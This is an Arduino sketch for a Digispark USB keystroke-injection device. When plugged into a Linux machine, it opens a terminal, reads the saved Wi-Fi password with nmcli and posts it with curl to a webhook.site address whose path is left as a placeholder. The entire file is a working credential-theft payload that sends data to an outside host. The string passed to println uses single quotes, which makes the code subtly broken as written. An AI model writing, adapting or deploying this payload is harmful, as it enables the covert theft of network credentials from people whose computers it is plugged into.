#include "DigiKeyboard.h"

#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(0x17,MOD_ALT_LEFT,MOD_CONTROL_RIGHT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println('OUTPUT=$(nmcli device wifi show-password);curl --data "${OUTPUT}" https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE>'); 
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);

  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);

}